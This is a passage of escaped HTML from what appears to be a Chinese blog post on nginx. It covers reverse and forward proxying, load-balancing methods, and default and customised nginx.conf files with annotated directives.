class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#定义Nginx运行的用户和用户组</span><br><span class=\"line\">#user  nobody;</span><br><span class=\"line\">#nginx进程数，建议设置为等于CPU总核心数。</span><br><span class=\"line\">worker_processes  1;</span><br><span class=\"line\"></span><br><span class=\"line\">#全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]</span><br><span class=\"line\">#error_log  logs/error.log;</span><br><span class=\"line\">#error_log  logs/error.log  notice;</span><br><span class=\"line\">#error_log  logs/error.log  info;</span><br><span class=\"line\"></span><br><span class=\"line\">#进程文件</span><br><span class=\"line\">#pid        logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#工作模式与连接数上限</span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">   #单个进程最大连接数（最大连接数=连接数*进程数）</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#设定http服务器</span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">   #文件扩展名与文件类型映射表</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    #默认文件类型</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">    #access_log  logs/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，</span><br><span class=\"line\">    # 如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。</span><br><span class=\"line\">    # 注意：如果图片显示不正常把这个改 成off。</span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #防止网络阻塞</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #长连接超时时间，单位是秒</span><br><span class=\"line\">    #keepalive_timeout  0;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启gzip压缩输出</span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #虚拟主机的配置</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        #监听端口</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        #域名可以有多个，用空格隔开</span><br><span class=\"line\">        server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        #默认编码</span><br><span class=\"line\">        #charset koi8-r;</span><br><span class=\"line\"></span><br><span class=\"line\">        #定义本虚拟主机的访问日志</span><br><span class=\"line\">        #access_log  logs/host.access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #error_page  404              /404.html;</span><br><span class=\"line\"></span><br><span class=\"line\">        # redirect server error pages to the static page /50x.html</span><br><span class=\"line\">        #</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    proxy_pass   http://127.0.0.1;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    root           html;</span><br><span class=\"line\">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        #    fastcgi_index  index.php;</span><br><span class=\"line\">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class=\"line\">        #    include        fastcgi_params;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class=\"line\">        # concurs with nginx&apos;s one</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ /\\.ht &#123;</span><br><span class=\"line\">        #    deny  all;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       8000;</span><br><span class=\"line\">    #    listen       somename:8080;</span><br><span class=\"line\">    #    server_name  somename  alias  another.alias;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # HTTPS server</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       443 ssl;</span><br><span class=\"line\">    #    server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_certificate      cert.pem;</span><br><span class=\"line\">    #    ssl_certificate_key  cert.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class=\"line\">    #    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    #    ssl_prefer_server_ciphers  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"nginx-conf配置\"><a href=\"#nginx-conf配置\" class=\"headerlink\" title=\"nginx.conf配置\"></a>nginx.conf配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#user  nobody;</span><br><span class=\"line\">worker_processes  1;</span><br><span class=\"line\"></span><br><span class=\"line\">#error_log  logs/error.log;</span><br><span class=\"line\">#error_log  logs/error.log  notice;</span><br><span class=\"line\">#error_log  logs/error.log  info;</span><br><span class=\"line\"></span><br><span class=\"line\">#pid        logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">    #access_log  logs/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #keepalive_timeout  0;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #在http&#123;&#125;内配置</span><br><span class=\"line\">    #自己进行负载均衡配置，weight为权重</span><br><span class=\"line\">    upstream sms&#123;</span><br><span class=\"line\">        server ip:port weight=1;</span><br><span class=\"line\">        server ip:port weight=1;</span><br><span class=\"line\">        #保证收发都是同一个连接</span><br><span class=\"line\">        ip_hash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    upstream xxx&#123;</span><br><span class=\"line\">        ......</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        #charset koi8-r;</span><br><span class=\"line\"></span><br><span class=\"line\">        #access_log  logs/host.access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #配置自己的转发,在server&#123;&#125;内配置</span><br><span class=\"line\">          #过来的url</span><br><span class=\"line\">          location /smsCollection/ &#123;</span><br><span class=\"line\">              #转发的url</span><br><span class=\"line\">              proxy_pass http://sms;</span><br><span class=\"line\">              proxy_set_header    REMOTE-HOST $remote_addr;</span><br><span class=\"line\">              proxy_set_header   Host $host:8080;</span><br><span class=\"line\">              proxy_set_header   X-Real-IP $remote_addr;</span><br><span class=\"line\">              proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">              proxy_read_timeout 300s;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          location /SmsUpstream-1.0/sms191 &#123;</span><br><span class=\"line\">              .....</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #error_page  404              /404.html;</span><br><span class=\"line\"></span><br><span class=\"line\">        # redirect server error pages to the static page /50x.html</span><br><span class=\"line\">        #</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    proxy_pass   http://127.0.0.1;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    root           html;</span><br><span class=\"line\">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        #    fastcgi_index  index.php;</span><br><span class=\"line\">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class=\"line\">        #    include        fastcgi_params;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class=\"line\">        # concurs with nginx&apos;s one</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ /\\.ht &#123;</span><br><span class=\"line\">        #    deny  all;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       8000;</span><br><span class=\"line\">    #    listen       somename:8080;</span><br><span class=\"line\">    #    server_name  somename  alias  another.alias;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # HTTPS server</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       443 ssl;</span><br><span class=\"line\">    #    server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_certificate      cert.pem;</span><br><span class=\"line\">    #    ssl_certificate_key  cert.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class=\"line\">    #    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    #    ssl_prefer_server_ciphers  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-nginx大概作用\"><a href=\"#1-nginx大概作用\" class=\"headerlink\" title=\"1.nginx大概作用\"></a>1.nginx大概作用</h4><p>原文链接: <a href=\"https://juejin.im/entry/58afa0975c497d006778502b\" target=\"_blank\" rel=\"noopener\">https://juejin.im/entry/58afa0975c497d006778502b</a><br></p>\n<h6 id=\"1-反向代理\"><a href=\"#1-反向代理\" class=\"headerlink\" title=\"1.反向代理\"></a>1.反向代理</h6><p>反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。简单来说就是真实的服务器不能直接被外部网络访问，所以需要一台代理服务器，而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境，当然也可能是同一台服务器，端口不同而已。<br></p>\n<p>RR（默认）<br><br>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除<br></p>\n<p>权重<br><br>指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。<br></p>\n<p>ip_hash<br><br>上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题<br></p>\n<h6 id=\"3-http服务器\"><a href=\"#3-http服务器\" class=\"headerlink\" title=\"3.http服务器\"></a>3.http服务器</h6><p>Nginx本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用Nginx来做服务器，同时现在也很流行动静分离，就可以通过Nginx来实现<br><br>动静分离<br><br>动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路<br></p>\n<h6 id=\"4-正向代理\"><a href=\"#4-正向代理\" class=\"headerlink\" title=\"4.正向代理\"></a>4.正向代理</h6><p>正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。当你需要把你的服务器作为代理服务器的时候，可以用Nginx来实现正向代理。<br></p>\n<p>问题： 正向反向的区别是部署在客户端还是服务端？？？？</p>\n<h5 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h5><p>ngginx可以热部署<br><br>nginx -s reload<br><br>nginx.exe -s reload</p>\n<h4 id=\"nginx-conf默认配置\"><a href=\"#nginx-conf默认配置\" class=\"headerlink\" title=\"nginx.conf默认配置\"></a>nginx.conf默认配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#定义Nginx运行的用户和用户组</span><br><span class=\"line\">#user  nobody;</span><br><span class=\"line\">#nginx进程数，建议设置为等于CPU总核心数。</span><br><span class=\"line\">worker_processes  1;</span><br><span class=\"line\"></span><br><span class=\"line\">#全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]</span><br><span class=\"line\">#error_log  logs/error.log;</span><br><span class=\"line\">#error_log  logs/error.log  notice;</span><br><span class=\"line\">#error_log  logs/error.log  info;</span><br><span class=\"line\"></span><br><span class=\"line\">#进程文件</span><br><span class=\"line\">#pid        logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#工作模式与连接数上限</span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">   #单个进程最大连接数（最大连接数=连接数*进程数）</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#设定http服务器</span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">   #文件扩展名与文件类型映射表</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    #默认文件类型</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">    #access_log  logs/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，</span><br><span class=\"line\">    # 如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。</span><br><span class=\"line\">    # 注意：如果图片显示不正常把这个改 成off。</span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #防止网络阻塞</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #长连接超时时间，单位是秒</span><br><span class=\"line\">    #keepalive_timeout  0;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启gzip压缩输出</span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #虚拟主机的配置</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        #监听端口</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        #域名可以有多个，用空格隔开</span><br><span class=\"line\">        server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        #默认编码</span><br><span class=\"line\">        #charset koi8-r;</span><br><span class=\"line\"></span><br><span class=\"line\">        #定义本虚拟主机的访问日志</span><br><span class=\"line\">        #access_log  logs/host.access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #error_page  404              /404.html;</span><br><span class=\"line\"></span><br><span class=\"line\">        # redirect server error pages to the static page /50x.html</span><br><span class=\"line\">        #</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # proxy the PHP scripts to Apache listening on 